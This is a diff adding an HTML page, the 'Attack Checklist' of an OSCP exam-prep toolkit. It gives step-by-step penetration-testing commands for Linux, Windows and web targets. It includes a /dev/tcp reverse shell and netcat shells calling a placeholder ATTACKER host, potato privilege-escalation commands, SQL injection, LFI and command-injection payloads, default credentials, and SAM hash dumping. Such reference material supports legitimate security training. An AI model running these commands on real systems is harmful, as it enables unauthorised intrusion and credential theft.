@@ -1,0 +1,813 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Attack Checklist - OSCP Toolkit</title>
+    <link rel="stylesheet" href="css/style.css">
+    <style>
+        .checklist {
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            padding: 25px;
+            margin: 25px 0;
+        }
+        
+        .checklist h3 {
+            margin-top: 0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .checklist-item {
+            display: flex;
+            align-items: flex-start;
+            padding: 12px 15px;
+            margin: 8px 0;
+            background: var(--bg-tertiary);
+            border-radius: 8px;
+            border-left: 3px solid var(--border-color);
+            transition: all 0.2s ease;
+        }
+        
+        .checklist-item:hover {
+            border-left-color: var(--accent-primary);
+        }
+        
+        .checklist-item.checked {
+            border-left-color: var(--accent-green);
+            opacity: 0.7;
+        }
+        
+        .checklist-item.checked .item-text {
+            text-decoration: line-through;
+            color: var(--text-muted);
+        }
+        
+        .checklist-item input[type="checkbox"] {
+            width: 20px;
+            height: 20px;
+            margin-right: 15px;
+            margin-top: 2px;
+            cursor: pointer;
+            accent-color: var(--accent-green);
+        }
+        
+        .item-content {
+            flex: 1;
+        }
+        
+        .item-text {
+            font-weight: 500;
+            color: var(--text-primary);
+            margin-bottom: 5px;
+        }
+        
+        .item-commands {
+            font-family: 'Cascadia Code', 'Fira Code', monospace;
+            font-size: 0.85rem;
+            color: var(--text-secondary);
+            background: var(--bg-code);
+            padding: 8px 12px;
+            border-radius: 5px;
+            margin-top: 8px;
+            overflow-x: auto;
+        }
+        
+        .item-note {
+            font-size: 0.85rem;
+            color: var(--accent-orange);
+            margin-top: 5px;
+            font-style: italic;
+        }
+        
+        .phase-header {
+            background: linear-gradient(135deg, var(--bg-tertiary) 0%, var(--bg-secondary) 100%);
+            padding: 15px 20px;
+            border-radius: 8px;
+            margin: 30px 0 15px 0;
+            border-left: 4px solid var(--accent-primary);
+        }
+        
+        .phase-header h4 {
+            margin: 0;
+            color: var(--accent-primary);
+            font-size: 1.1rem;
+        }
+        
+        .progress-bar {
+            background: var(--bg-tertiary);
+            border-radius: 10px;
+            height: 20px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            background: linear-gradient(90deg, var(--accent-green), var(--accent-cyan));
+            height: 100%;
+            width: 0%;
+            transition: width 0.3s ease;
+            border-radius: 10px;
+        }
+        
+        .progress-text {
+            text-align: center;
+            font-size: 0.9rem;
+            color: var(--text-secondary);
+            margin-top: 5px;
+        }
+        
+        .reset-btn {
+            background: var(--accent-red);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 500;
+            margin-top: 15px;
+        }
+        
+        .reset-btn:hover {
+            opacity: 0.9;
+        }
+        
+        .tab-container {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .tab-btn {
+            padding: 12px 30px;
+            background: var(--bg-secondary);
+            border: 1px solid var(--border-color);
+            color: var(--text-secondary);
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 500;
+            font-size: 1rem;
+            transition: all 0.2s ease;
+        }
+        
+        .tab-btn:hover {
+            border-color: var(--accent-primary);
+            color: var(--text-primary);
+        }
+        
+        .tab-btn.active {
+            background: var(--accent-primary);
+            color: var(--bg-primary);
+            border-color: var(--accent-primary);
+        }
+        
+        .tab-content {
+            display: none;
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        .quick-ref {
+            background: rgba(88, 166, 255, 0.1);
+            border: 1px solid rgba(88, 166, 255, 0.3);
+            border-radius: 8px;
+            padding: 15px;
+            margin: 10px 0;
+        }
+        
+        .quick-ref code {
+            background: var(--bg-code);
+            padding: 2px 6px;
+            border-radius: 3px;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <h1>✅ Attack Checklist</h1>
+            <nav>
+                <a href="index.html">Home</a>
+                <a href="quickcmds.html">⚡ Quick Cmds</a>
+                <a href="tools.html">🛠️ Tools</a>
+                <a href="reverse_shells.html">Shells</a>
+                <a href="enumeration.html">Enumeration</a>
+                <a href="privesc_linux.html">Linux PrivEsc</a>
+                <a href="privesc_windows.html">Windows PrivEsc</a>
+                <a href="buffer_overflow.html">Buffer Overflow</a>
+                <a href="transfer_files.html">File Transfer</a>
+                <a href="pivoting.html">Pivoting</a>
+                <a href="checklist.html" class="active">Checklist</a>
+            </nav>
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="alert alert-info">
+            📋 <strong>Step-by-step methodology</strong> - Check off each step as you complete it. Progress is saved in your browser!
+        </div>
+
+        <div class="tab-container">
+            <button class="tab-btn active" onclick="showTab('linux')">🐧 Linux Target</button>
+            <button class="tab-btn" onclick="showTab('windows')">🪟 Windows Target</button>
+            <button class="tab-btn" onclick="showTab('web')">🌐 Web Application</button>
+        </div>
+
+        <!-- LINUX CHECKLIST -->
+        <div id="linux" class="tab-content active">
+            <div class="progress-bar"><div class="progress-fill" id="linux-progress"></div></div>
+            <div class="progress-text" id="linux-progress-text">0 / 0 completed</div>
+
+            <div class="phase-header"><h4>📡 Phase 1: Reconnaissance</h4></div>
+            <div class="checklist" data-group="linux">
+                <div class="checklist-item">
+                    <input type="checkbox" id="l1">
+                    <div class="item-content">
+                        <div class="item-text">Quick port scan (top 1000)</div>
+                        <div class="item-commands">nmap -sC -sV -oA nmap/initial TARGET</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="l2">
+                    <div class="item-content">
+                        <div class="item-text">Full port scan (all 65535)</div>
+                        <div class="item-commands">nmap -p- -sC -sV -oA nmap/full TARGET</div>
+                        <div class="item-note">Run in background while enumerating initial ports</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="l3">
+                    <div class="item-content">
+                        <div class="item-text">UDP scan (top 20)</div>
+                        <div class="item-commands">nmap -sU --top-ports 20 -oA nmap/udp TARGET</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="phase-header"><h4>🔍 Phase 2: Service Enumeration</h4></div>
+            <div class="checklist" data-group="linux">
+                <div class="checklist-item">
+                    <input type="checkbox" id="l4">
+                    <div class="item-content">
+                        <div class="item-text">Check for low-hanging fruit</div>
+                        <div class="item-note">Anonymous FTP? Default creds? Known CVEs for versions?</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="l5">
+                    <div class="item-content">
+                        <div class="item-text">Web enumeration (if HTTP/HTTPS)</div>
+                        <div class="item-commands">gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,html,txt</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="l6">
+                    <div class="item-content">
+                        <div class="item-text">Check robots.txt, sitemap.xml, source code</div>
+                        <div class="item-commands">curl http://TARGET/robots.txt</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="l7">
+                    <div class="item-content">
+                        <div class="item-text">SMB enumeration (if port 445 open)</div>
+                        <div class="item-commands">enum4linux -a TARGET<br>smbclient -L //TARGET -N</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="l8">
+                    <div class="item-content">
+                        <div class="item-text">Searchsploit service versions</div>
+                        <div class="item-commands">searchsploit SERVICE VERSION</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="phase-header"><h4>🚪 Phase 3: Initial Access</h4></div>
+            <div class="checklist" data-group="linux">
+                <div class="checklist-item">
+                    <input type="checkbox" id="l9">
+                    <div class="item-content">
+                        <div class="item-text">Try default/common credentials</div>
+                        <div class="item-note">admin:admin, root:root, admin:password, guest:guest</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="l10">
+                    <div class="item-content">
+                        <div class="item-text">Exploit vulnerability / get shell</div>
+                        <div class="item-note">Start listener: nc -lvnp 4444</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="l11">
+                    <div class="item-content">
+                        <div class="item-text">Upgrade shell to TTY</div>
+                        <div class="item-commands">python3 -c 'import pty; pty.spawn("/bin/bash")'<br>Ctrl-Z → stty raw -echo; fg → reset</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="phase-header"><h4>🔐 Phase 4: Post-Exploitation / PrivEsc</h4></div>
+            <div class="checklist" data-group="linux">
+                <div class="checklist-item">
+                    <input type="checkbox" id="l12">
+                    <div class="item-content">
+                        <div class="item-text">Get user flag</div>
+                        <div class="item-commands">cat /home/*/user.txt</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="l13">
+                    <div class="item-content">
+                        <div class="item-text">Run LinPEAS</div>
+                        <div class="item-commands">wget http://ATTACKER/linpeas.sh<br>chmod +x linpeas.sh &amp;&amp; ./linpeas.sh | tee linpeas.txt</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="l14">
+                    <div class="item-content">
+                        <div class="item-text">Check sudo permissions</div>
+                        <div class="item-commands">sudo -l</div>
+                        <div class="item-note">Check GTFOBins for any allowed commands!</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="l15">
+                    <div class="item-content">
+                        <div class="item-text">Check SUID binaries</div>
+                        <div class="item-commands">find / -perm -4000 -type f 2>/dev/null</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="l16">
+                    <div class="item-content">
+                        <div class="item-text">Check capabilities</div>
+                        <div class="item-commands">getcap -r / 2>/dev/null</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="l17">
+                    <div class="item-content">
+                        <div class="item-text">Check cron jobs</div>
+                        <div class="item-commands">cat /etc/crontab<br>ls -la /etc/cron.*</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="l18">
+                    <div class="item-content">
+                        <div class="item-text">Run pspy (monitor processes)</div>
+                        <div class="item-commands">./pspy64</div>
+                        <div class="item-note">Watch for cron jobs running as root</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="l19">
+                    <div class="item-content">
+                        <div class="item-text">Search for passwords in files</div>
+                        <div class="item-commands">grep -r "password" /home 2>/dev/null<br>cat ~/.bash_history</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="l20">
+                    <div class="item-content">
+                        <div class="item-text">Check for SSH keys</div>
+                        <div class="item-commands">find / -name "id_rsa" 2>/dev/null</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="l21">
+                    <div class="item-content">
+                        <div class="item-text">Check kernel version for exploits</div>
+                        <div class="item-commands">uname -r<br>searchsploit linux kernel VERSION</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="phase-header"><h4>🏆 Phase 5: Root Access</h4></div>
+            <div class="checklist" data-group="linux">
+                <div class="checklist-item">
+                    <input type="checkbox" id="l22">
+                    <div class="item-content">
+                        <div class="item-text">Exploit privesc vector</div>
+                        <div class="item-note">Use findings from enumeration</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="l23">
+                    <div class="item-content">
+                        <div class="item-text">Get root flag</div>
+                        <div class="item-commands">cat /root/root.txt</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="l24">
+                    <div class="item-content">
+                        <div class="item-text">Document everything for report</div>
+                        <div class="item-note">Screenshots, commands used, exploits</div>
+                    </div>
+                </div>
+            </div>
+
+            <button class="reset-btn" onclick="resetChecklist('linux')">🔄 Reset Linux Checklist</button>
+        </div>
+
+        <!-- WINDOWS CHECKLIST -->
+        <div id="windows" class="tab-content">
+            <div class="progress-bar"><div class="progress-fill" id="windows-progress"></div></div>
+            <div class="progress-text" id="windows-progress-text">0 / 0 completed</div>
+
+            <div class="phase-header"><h4>📡 Phase 1: Reconnaissance</h4></div>
+            <div class="checklist" data-group="windows">
+                <div class="checklist-item">
+                    <input type="checkbox" id="w1">
+                    <div class="item-content">
+                        <div class="item-text">Quick port scan (top 1000)</div>
+                        <div class="item-commands">nmap -sC -sV -oA nmap/initial TARGET</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="w2">
+                    <div class="item-content">
+                        <div class="item-text">Full port scan (all 65535)</div>
+                        <div class="item-commands">nmap -p- -sC -sV -oA nmap/full TARGET</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="w3">
+                    <div class="item-content">
+                        <div class="item-text">UDP scan (top 20)</div>
+                        <div class="item-commands">nmap -sU --top-ports 20 -oA nmap/udp TARGET</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="phase-header"><h4>🔍 Phase 2: Service Enumeration</h4></div>
+            <div class="checklist" data-group="windows">
+                <div class="checklist-item">
+                    <input type="checkbox" id="w4">
+                    <div class="item-content">
+                        <div class="item-text">SMB enumeration</div>
+                        <div class="item-commands">enum4linux -a TARGET<br>smbclient -L //TARGET -N<br>crackmapexec smb TARGET -u '' -p '' --shares</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="w5">
+                    <div class="item-content">
+                        <div class="item-text">Check for SMB vulnerabilities</div>
+                        <div class="item-commands">nmap --script smb-vuln* -p 445 TARGET</div>
+                        <div class="item-note">EternalBlue (MS17-010)?</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="w6">
+                    <div class="item-content">
+                        <div class="item-text">Web enumeration (if HTTP/HTTPS)</div>
+                        <div class="item-commands">gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x asp,aspx,html,txt</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="w7">
+                    <div class="item-content">
+                        <div class="item-text">RPC enumeration</div>
+                        <div class="item-commands">rpcclient -U '' -N TARGET<br>enum4linux -a TARGET</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="w8">
+                    <div class="item-content">
+                        <div class="item-text">Searchsploit service versions</div>
+                        <div class="item-commands">searchsploit SERVICE VERSION</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="phase-header"><h4>🚪 Phase 3: Initial Access</h4></div>
+            <div class="checklist" data-group="windows">
+                <div class="checklist-item">
+                    <input type="checkbox" id="w9">
+                    <div class="item-content">
+                        <div class="item-text">Try default/common credentials</div>
+                        <div class="item-note">Administrator:password, admin:admin, guest:guest</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="w10">
+                    <div class="item-content">
+                        <div class="item-text">Exploit vulnerability / get shell</div>
+                        <div class="item-note">Start listener: nc -lvnp 4444</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="w11">
+                    <div class="item-content">
+                        <div class="item-text">Try WinRM if port 5985 open</div>
+                        <div class="item-commands">evil-winrm -i TARGET -u USER -p PASSWORD</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="w12">
+                    <div class="item-content">
+                        <div class="item-text">Try psexec if you have creds</div>
+                        <div class="item-commands">psexec.py DOMAIN/USER:PASSWORD@TARGET</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="phase-header"><h4>🔐 Phase 4: Post-Exploitation / PrivEsc</h4></div>
+            <div class="checklist" data-group="windows">
+                <div class="checklist-item">
+                    <input type="checkbox" id="w13">
+                    <div class="item-content">
+                        <div class="item-text">Get user flag</div>
+                        <div class="item-commands">type C:\Users\USER\Desktop\user.txt</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="w14">
+                    <div class="item-content">
+                        <div class="item-text">Check current privileges</div>
+                        <div class="item-commands">whoami /priv<br>whoami /groups</div>
+                        <div class="item-note">SeImpersonate? SeBackup? SeRestore?</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="w15">
+                    <div class="item-content">
+                        <div class="item-text">Run WinPEAS</div>
+                        <div class="item-commands">certutil -urlcache -f http://ATTACKER/winPEASx64.exe winpeas.exe<br>.\winpeas.exe</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="w16">
+                    <div class="item-content">
+                        <div class="item-text">If SeImpersonate → Potato attack</div>
+                        <div class="item-commands">.\PrintSpoofer.exe -c "nc.exe ATTACKER PORT -e cmd"<br>.\GodPotato.exe -cmd "nc.exe ATTACKER PORT -e cmd"</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="w17">
+                    <div class="item-content">
+                        <div class="item-text">Check for unquoted service paths</div>
+                        <div class="item-commands">wmic service get name,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows"</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="w18">
+                    <div class="item-content">
+                        <div class="item-text">Check AlwaysInstallElevated</div>
+                        <div class="item-commands">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated<br>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="w19">
+                    <div class="item-content">
+                        <div class="item-text">Check for stored credentials</div>
+                        <div class="item-commands">cmdkey /list<br>reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="w20">
+                    <div class="item-content">
+                        <div class="item-text">Search for passwords in files</div>
+                        <div class="item-commands">findstr /si password *.txt *.ini *.config *.xml</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="w21">
+                    <div class="item-content">
+                        <div class="item-text">Check scheduled tasks</div>
+                        <div class="item-commands">schtasks /query /fo LIST /v</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="phase-header"><h4>🏆 Phase 5: Admin/SYSTEM Access</h4></div>
+            <div class="checklist" data-group="windows">
+                <div class="checklist-item">
+                    <input type="checkbox" id="w22">
+                    <div class="item-content">
+                        <div class="item-text">Exploit privesc vector</div>
+                        <div class="item-note">Use findings from enumeration</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="w23">
+                    <div class="item-content">
+                        <div class="item-text">Get root/admin flag</div>
+                        <div class="item-commands">type C:\Users\Administrator\Desktop\root.txt</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="w24">
+                    <div class="item-content">
+                        <div class="item-text">Dump hashes (optional)</div>
+                        <div class="item-commands">reg save hklm\sam sam<br>reg save hklm\system system<br>secretsdump.py -sam sam -system system LOCAL</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="w25">
+                    <div class="item-content">
+                        <div class="item-text">Document everything for report</div>
+                        <div class="item-note">Screenshots, commands used, exploits</div>
+                    </div>
+                </div>
+            </div>
+
+            <button class="reset-btn" onclick="resetChecklist('windows')">🔄 Reset Windows Checklist</button>
+        </div>
+
+        <!-- WEB CHECKLIST -->
+        <div id="web" class="tab-content">
+            <div class="progress-bar"><div class="progress-fill" id="web-progress"></div></div>
+            <div class="progress-text" id="web-progress-text">0 / 0 completed</div>
+
+            <div class="phase-header"><h4>🔍 Phase 1: Reconnaissance</h4></div>
+            <div class="checklist" data-group="web">
+                <div class="checklist-item">
+                    <input type="checkbox" id="wb1">
+                    <div class="item-content">
+                        <div class="item-text">Identify technologies</div>
+                        <div class="item-commands">whatweb http://TARGET<br>curl -I http://TARGET</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="wb2">
+                    <div class="item-content">
+                        <div class="item-text">Check robots.txt &amp; sitemap.xml</div>
+                        <div class="item-commands">curl http://TARGET/robots.txt<br>curl http://TARGET/sitemap.xml</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="wb3">
+                    <div class="item-content">
+                        <div class="item-text">View page source for comments/hints</div>
+                        <div class="item-note">Look for hidden paths, credentials, version info</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="wb4">
+                    <div class="item-content">
+                        <div class="item-text">Directory brute force</div>
+                        <div class="item-commands">gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="wb5">
+                    <div class="item-content">
+                        <div class="item-text">Check for virtual hosts/subdomains</div>
+                        <div class="item-commands">gobuster vhost -u http://TARGET -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="phase-header"><h4>🎯 Phase 2: Vulnerability Testing</h4></div>
+            <div class="checklist" data-group="web">
+                <div class="checklist-item">
+                    <input type="checkbox" id="wb6">
+                    <div class="item-content">
+                        <div class="item-text">Test for SQL Injection</div>
+                        <div class="item-commands">' OR '1'='1<br>' OR 1=1--<br>sqlmap -u "http://TARGET/page?id=1" --batch</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="wb7">
+                    <div class="item-content">
+                        <div class="item-text">Test for LFI/RFI</div>
+                        <div class="item-commands">?page=../../../etc/passwd<br>?page=php://filter/convert.base64-encode/resource=index.php</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="wb8">
+                    <div class="item-content">
+                        <div class="item-text">Test for command injection</div>
+                        <div class="item-commands">; ls<br>| whoami<br>`id`<br>$(whoami)</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="wb9">
+                    <div class="item-content">
+                        <div class="item-text">Test file upload functionality</div>
+                        <div class="item-note">Try uploading PHP shell, bypass extensions (.php.jpg, .phtml)</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="wb10">
+                    <div class="item-content">
+                        <div class="item-text">Test authentication</div>
+                        <div class="item-note">Default creds, SQL auth bypass, brute force</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="wb11">
+                    <div class="item-content">
+                        <div class="item-text">Run Nikto</div>
+                        <div class="item-commands">nikto -h http://TARGET</div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="phase-header"><h4>🚪 Phase 3: Exploitation</h4></div>
+            <div class="checklist" data-group="web">
+                <div class="checklist-item">
+                    <input type="checkbox" id="wb12">
+                    <div class="item-content">
+                        <div class="item-text">Searchsploit for CMS/framework</div>
+                        <div class="item-commands">searchsploit wordpress<br>searchsploit drupal<br>searchsploit apache VERSION</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="wb13">
+                    <div class="item-content">
+                        <div class="item-text">Exploit vulnerability</div>
+                        <div class="item-note">Start listener: nc -lvnp 4444</div>
+                    </div>
+                </div>
+                <div class="checklist-item">
+                    <input type="checkbox" id="wb14">
+                    <div class="item-content">
+                        <div class="item-text">Get reverse shell</div>
+                        <div class="item-commands">bash -i &gt;&amp; /dev/tcp/ATTACKER/PORT 0&gt;&amp;1</div>
+                    </div>
+                </div>
+            </div>
+
+            <button class="reset-btn" onclick="resetChecklist('web')">🔄 Reset Web Checklist</button>
+        </div>
+
+        <footer>
+            <p>OSCP Toolkit | Good luck on your exam! 🎯</p>
+        </footer>
+    </div>
+
+    <script>
+        // Tab switching
+        function showTab(tabId) {
+            document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
+            document.querySelectorAll('.tab-btn').forEach(btn => btn.classList.remove('active'));
+            document.getElementById(tabId).classList.add('active');
+            event.target.classList.add('active');
+            updateProgress(tabId);
+        }
+
+        // Load saved state
+        function loadState() {
+            document.querySelectorAll('input[type="checkbox"]').forEach(cb => {
+                const saved = localStorage.getItem(cb.id);
+                if (saved === 'true') {
+                    cb.checked = true;
+                    cb.closest('.checklist-item').classList.add('checked');
+                }
+            });
+            updateProgress('linux');
+            updateProgress('windows');
+            updateProgress('web');
+        }
+
+        // Save state on change
+        document.querySelectorAll('input[type="checkbox"]').forEach(cb => {
+            cb.addEventListener('change', function() {
+                localStorage.setItem(this.id, this.checked);
+                this.closest('.checklist-item').classList.toggle('checked', this.checked);
+                const group = this.closest('.tab-content').id;
+                updateProgress(group);
+            });
+        });
+
+        // Update progress bar
+        function updateProgress(group) {
+            const container = document.getElementById(group);
+            const checkboxes = container.querySelectorAll('input[type="checkbox"]');
+            const checked = container.querySelectorAll('input[type="checkbox"]:checked');
+            const percent = checkboxes.length ? (checked.length / checkboxes.length) * 100 : 0;
+            
+            document.getElementById(group + '-progress').style.width = percent + '%';
+            document.getElementById(group + '-progress-text').textContent = 
+                checked.length + ' / ' + checkboxes.length + ' completed';
+        }
+
+        // Reset checklist
+        function resetChecklist(group) {
+            if (confirm('Reset all checkboxes in this checklist?')) {
+                const container = document.getElementById(group);
+                container.querySelectorAll('input[type="checkbox"]').forEach(cb => {
+                    cb.checked = false;
+                    localStorage.setItem(cb.id, 'false');
+                    cb.closest('.checklist-item').classList.remove('checked');
+                });
+                updateProgress(group);
+            }
+        }
+
+        // Initialize
+        loadState();
+    </script>
+</body>
+</html>
+
+
